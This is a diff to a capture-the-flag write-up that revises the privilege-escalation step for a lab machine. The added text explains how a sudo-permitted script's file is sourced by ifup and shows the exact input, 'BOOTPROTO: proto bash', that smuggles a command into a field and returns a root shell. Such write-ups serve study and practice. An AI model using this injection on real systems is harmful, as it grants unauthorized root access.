@@ -67,9 +67,19 @@ User guly may run the following commands on networked:
     (root) NOPASSWD: /usr/local/sbin/changename.sh
 ```
 
-The script reads values and feeds them to `ifconfig`/`ifup` unquoted; a line with spaces is parsed as an assignment plus a command.
+The script (`#!/bin/bash -p`) writes `/etc/sysconfig/network-scripts/ifcfg-guly` with the values you type and then runs `/sbin/ifup guly0`. `ifup` **sources** that file, so a value containing a space stops being an assignment and becomes a **command**. The per-line check (`^[a-zA-Z0-9_ /-]+$`) allows the space: that is the flaw.
 
-With a crafted `IFACE`/`NAME` value that runs `/bin/bash`, root follows.
+```text
+sudo /usr/local/sbin/changename.sh
+interface NAME:          eth0
+interface PROXY_METHOD:  none
+interface BROWSER_ONLY:  no
+interface BOOTPROTO:     proto bash
+```
+
+```text
+[root@networked network-scripts]#
+```
 
 ## Pitfalls
 
